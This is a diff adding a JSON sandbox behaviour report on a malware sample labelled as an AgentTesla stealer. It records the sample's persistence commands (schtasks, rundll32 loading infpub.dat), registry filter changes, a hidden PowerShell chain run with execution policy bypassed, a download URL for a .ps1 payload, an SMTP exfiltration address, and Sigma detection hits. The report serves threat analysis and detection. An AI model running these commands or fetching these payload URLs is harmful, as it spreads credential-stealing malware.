@@ -1,0 +1,411 @@
+{
+  "success": true,
+  "status_code": 200,
+  "json": {
+    "data": {
+      "verdict_confidence": 70,
+      "command_executions": [
+        "C:\\Windows\\System32\\svchost.exe -k WerSvcGroup",
+        "schtasks  /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR \"C:\\Windows\\system32\\cmd.exe /C Start \\\"\\\" \\\"C:\\Windows\\dispci.exe\\\" -id 515874960 && exit\"",
+        "/c schtasks /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR \"C:\\Windows\\system32\\cmd.exe /C Start \\\"\\\" \\\"C:\\Windows\\dispci.exe\\\" -id 515874960 && exit\"",
+        "\\??\\C:\\Windows\\system32\\conhost.exe",
+        "schtasks  /Delete /F /TN rhaegal",
+        "/c schtasks /Delete /F /TN rhaegal",
+        "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\infpub.dat,#1 15 \"tom-PC\\Administrator:rising\"",
+        "  /B //E:vbscript c:/analyse/1760620128.234647_b0e519f9-b0f0-486a-b013-ed729d5cf910",
+        "C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\infpub.dat\",#2 15 \"tom-PC\\Administrator:rising\""
+      ],
+      "files_written": [
+        "C:\\Windows\\cscc.dat",
+        "C:\\Windows\\dispci.exe",
+        "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
+        "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5",
+        "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Cookies",
+        "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\IETldCache",
+        "C:\\Temp\\",
+        "C:\\Users\\Administrator\\AppData\\Roaming\\WindowsSystem\\"
+      ],
+      "mutexes_created": [
+        "E7256B3F3AD6FDE5",
+        "IESQMMUTEX_0_208",
+        "Local\\!IETld!Mutex",
+        "Local\\WininetProxyRegistryMutex",
+        "Local\\WininetStartupMutex",
+        "Local\\ZoneAttributeCacheCounterMutex",
+        "Local\\ZonesCacheCounterMutex",
+        "Local\\ZonesCounterMutex",
+        "Local\\ZonesLockedCacheCounterMutex",
+        "Local\\_!MSFTHISTORY!_",
+        "Local\\c:!users!administrator!appdata!local!microsoft!windows!history!history.ie5!",
+        "Local\\c:!users!administrator!appdata!local!microsoft!windows!temporary internet files!content.ie5!",
+        "Local\\c:!users!administrator!appdata!roaming!microsoft!windows!cookies!",
+        "Local\\c:!users!administrator!appdata!roaming!microsoft!windows!ietldcache!",
+        "RasPbFile"
+      ],
+      "files_deleted": [
+        "C:\\Windows\\infpub.dat"
+      ],
+      "processes_created": [
+        "C:\\Windows\\System32\\schtasks.exe",
+        "C:\\Windows\\System32\\cmd.exe",
+        "C:\\Windows\\System32\\rundll32.exe"
+      ],
+      "registry_keys_set": [
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Class\\{4D36E965-E325-11CE-BFC1-08002BE10318}\\UpperFilters",
+          "value": "cscc"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Class\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\\LowerFilters",
+          "value": "cscc"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\CrashControl\\DumpFilters",
+          "value": "cscc"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\DefaultConnectionSettings"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable",
+          "value": "0"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\fe-54-00-3d-c8-f4\\WpadDecision",
+          "value": "3"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\fe-54-00-3d-c8-f4\\WpadDecisionReason",
+          "value": "1"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\fe-54-00-3d-c8-f4\\WpadDecisionTime"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}\\WpadDecision",
+          "value": "3"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}\\WpadDecisionReason",
+          "value": "1"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}\\WpadDecisionTime"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}\\WpadNetworkName",
+          "value": "\u7f51\u7edc  10"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32\\ConsoleTracingMask",
+          "value": "4294901760"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32\\EnableConsoleTracing",
+          "value": "0"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32\\EnableFileTracing",
+          "value": "0"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32\\FileDirectory",
+          "value": "%windir%\\tracing"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32\\FileTracingMask",
+          "value": "4294901760"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32\\MaxFileSize",
+          "value": "1048576"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS\\ConsoleTracingMask",
+          "value": "4294901760"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS\\EnableConsoleTracing",
+          "value": "0"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS\\EnableFileTracing",
+          "value": "0"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS\\FileDirectory",
+          "value": "%windir%\\tracing"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS\\FileTracingMask",
+          "value": "4294901760"
+        },
+        {
+          "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS\\MaxFileSize",
+          "value": "1048576"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\WpadLastNetwork",
+          "value": "{0C50607A-15FA-47CE-B19E-09834E826021}"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect",
+          "value": "1"
+        },
+        {
+          "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet",
+          "value": "0"
+        }
+      ],
+      "files_opened": [
+        "C:\\",
+        "C:\\Windows\\cscc.dat",
+        "C:\\Windows\\dispci.exe",
+        "C:\\Temp\\",
+        "C:\\Users\\Administrator\\AppData\\Roaming\\WindowsSystem\\",
+        "\\??\\MountPointManager",
+        "\\??\\Nsi",
+        "\\DEVICE\\NETBT_TCPIP_{CA8FCF09-3454-4A77-8B0B-C56C1488303C}",
+        "\\DEVICE\\NETBT_TCPIP_{D5CD48D7-B0F7-4C10-89F8-4DF45C40E31E}",
+        "\\DEVICE\\NETBT_TCPIP_{DCF5E7D8-4DB5-460B-B10A-62818BEB69E8}",
+        "\\DEVICE\\NETBT_TCPIP_{E29AC6C2-7037-11DE-816D-806E6F6E6963}",
+        "\\Device\\Afd\\AsyncConnectHlp",
+        "\\Device\\Afd\\Endpoint",
+        "\\Device\\NetBT_Tcpip6_{CA8FCF09-3454-4A77-8B0B-C56C1488303C}",
+        "\\Device\\NetBT_Tcpip6_{D5CD48D7-B0F7-4C10-89F8-4DF45C40E31E}",
+        "\\Device\\NetBT_Tcpip6_{DCF5E7D8-4DB5-460B-B10A-62818BEB69E8}",
+        "\\Device\\NetBT_Tcpip_{D5CD48D7-B0F7-4C10-89F8-4DF45C40E31E}",
+        "\\Device\\RasAcd",
+        "c:\\",
+        "\\SystemRoot\\AppPatch\\sysmain.sdb"
+      ],
+      "ip_traffic": [
+        {
+          "destination_ip": "217.144.107.148",
+          "destination_port": 443
+        }
+      ],
+      "registry_keys_opened": [
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}",
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}\\fe-54-00-3d-c8-f4",
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script Host",
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\fe-54-00-3d-c8-f4",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASAPI32",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Tracing\\wscript_RASMANCS",
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script Host\\Settings"
+      ],
+      "memory_pattern_domains": [
+        "mail.gradin.hr"
+      ],
+      "verdict_labels": [
+        "AgentTesla",
+        "AgentTesla2",
+        "BrowserStealerGeneric",
+        "KeyloggerGeneric"
+      ],
+      "services_created": [
+        "cscc"
+      ],
+      "verdicts": [
+        "STEALER"
+      ],
+      "memory_pattern_urls": [
+        "smtp://mail.gradin.hr:587"
+      ],
+      "sigma_analysis_results": [
+        {
+          "match_context": [
+            {
+              "values": {
+                "CommandLine": "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\infpub.dat,#1 15 \"tom-PC\\Administrator:rising\"",
+                "Image": "C:\\Windows\\system32\\rundll32.exe",
+                "EventID": "1"
+              }
+            },
+            {
+              "values": {
+                "CommandLine": "C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\infpub.dat\",#2 15 \"tom-PC\\Administrator:rising\"",
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+                "EventID": "1"
+              }
+            }
+          ],
+          "rule_level": "critical",
+          "rule_id": "90c63349e180656f865f6206a06dbee57bd3226b32eb61fba3e6c7c4452d4e1d",
+          "rule_source": "Joe Security Rule Set (GitHub)",
+          "rule_title": "Execute DLL with spoofed extension",
+          "rule_description": "Execute DLL with spoofed extension",
+          "rule_author": "Joe Security"
+        },
+        {
+          "match_context": [
+            {
+              "values": {
+                "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe",
+                "Image": "\\??\\C:\\Windows\\system32\\conhost.exe",
+                "EventID": "1"
+              }
+            }
+          ],
+          "rule_level": "high",
+          "rule_id": "25fc56c1bee673d7ff3edcf371e4d2a36c0af83222da348961b87735c8efa61f",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "System File Execution Location Anomaly",
+          "rule_description": "Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.\n",
+          "rule_author": "Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali (Nextron Systems)"
+        },
+        {
+          "match_context": [
+            {
+              "values": {
+                "CommandLine": "C:\\Windows\\System32\\rundll32.exe",
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+                "EventID": "1"
+              }
+            }
+          ],
+          "rule_level": "high",
+          "rule_id": "87574dead19ceb246e10ccb4cb4fd5009c71c46de0d77965d2170bfafc2c3b14",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Rundll32 Execution Without CommandLine Parameters",
+          "rule_description": "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity",
+          "rule_author": "Florian Roth (Nextron Systems)"
+        },
+        {
+          "match_context": [
+            {
+              "values": {
+                "CommandLine": "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\infpub.dat,#1 15 \"tom-PC\\Administrator:rising\"",
+                "Image": "C:\\Windows\\system32\\rundll32.exe",
+                "EventID": "1"
+              }
+            },
+            {
+              "values": {
+                "CommandLine": "C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\infpub.dat\",#2 15 \"tom-PC\\Administrator:rising\"",
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+                "EventID": "1"
+              }
+            },
+            {
+              "values": {
+                "CommandLine": "C:\\Windows\\System32\\rundll32.exe",
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+                "EventID": "1"
+              }
+            }
+          ],
+          "rule_level": "medium",
+          "rule_id": "e7856bac967038b016efab8e4f315a2f16ccd6ba62f20d73df0ad3826fe654a3",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Rundll32 Execution With Uncommon DLL Extension",
+          "rule_description": "Detects the execution of rundll32 with a command line that doesn't contain a common extension",
+          "rule_author": "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou"
+        },
+        {
+          "match_context": [
+            {
+              "values": {
+                "EventID": "13",
+                "EventType": "SetValue",
+                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\DefaultConnectionSettings"
+              }
+            },
+            {
+              "values": {
+                "EventType": "SetValue",
+                "EventID": "13",
+                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings"
+              }
+            },
+            {
+              "values": {
+                "EventType": "SetValue",
+                "EventID": "13",
+                "Details": "\u7f51\u7edc  10",
+                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{0C50607A-15FA-47CE-B19E-09834E826021}\\WpadNetworkName"
+              }
+            },
+            {
+              "values": {
+                "EventID": "13",
+                "Details": "{0C50607A-15FA-47CE-B19E-09834E826021}",
+                "EventType": "SetValue",
+                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\WpadLastNetwork"
+              }
+            }
+          ],
+          "rule_level": "low",
+          "rule_id": "7ca43f2acf2c039e776af286dca2b5216d23967e6e8fe43dd5a5cc95f86e52e5",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Modification of IE Registry Settings",
+          "rule_description": "Detects modification of the registry settings used for Internet Explorer and other Windows components that use these settings. An attacker can abuse this registry key to add a domain to the trusted sites Zone or insert JavaScript for persistence",
+          "rule_author": "frack113"
+        }
+      ],
+      "processes_tree": [
+        {
+          "process_id": "2500",
+          "name": "wscript.exe \"%TEMP%\\New I-Con PO PO0704059-2.vbs\"",
+          "children": [
+            {
+              "process_id": "2680",
+              "name": "\"%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\Temp\\gaC1UYQE.ps1\"",
+              "children": [
+                {
+                  "process_id": "2716",
+                  "name": "\"pwsh.exe\" -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Temp\\gaC1UYQE.ps1",
+                  "children": [
+                    {
+                      "process_id": "1104",
+                      "name": "\"%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe\""
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ],
+      "files_dropped": [
+        {
+          "path": "%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe",
+          "sha256": "d7409d01e21b22084f3c166022c69ad46ddd7aaaff8eed6eb540961d3a196aea"
+        }
+      ],
+      "http_conversations": [
+        {
+          "url": "https://mzgold.ir:443/wp-content/uploads/2026/PO-51202509.ps1",
+          "request_method": "GET",
+          "request_headers": {
+            "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+            "Ua-Cpu": "AMD64",
+            "Accept": "*/*"
+          },
+          "response_headers": {
+            "Vary": "Accept-Encoding",
+            "Cache-Control": "public, max-age=2592000",
+            "Server": "BitNinja-Waf3; LiteSpeed",
+            "Expires": "Thu, 06 Nov 2025 21:50:32 GMT",
+            "Content-Type": "application/octet-stream",
+            "Accept-Ranges": "bytes",
+            "Connection": "close",
+            "X-Turbo-Charged-By": "LiteSpeed",
+            "Date": "Tue, 07 Oct 2025 21:50:32 GMT",
+            "Transfer-Encoding": "chunked",
+            "Alt-Svc": "h3=\":60413\"; ma=2592000,h3=\":60414\"; ma=2592000,h3=\":60418\"; ma=2592000",
+            "Last-Modified": "Tue, 07 Oct 2025 19:02:14 GMT"
+          },
+          "response_status_code": 2
+        },
+        {
+          "url": "http://mzgold.ir/wp-content/uploads/2026/PO-51202509.ps1",
+          "request_method": "GET"
+        }
+      ]
+    }
+  }
+}
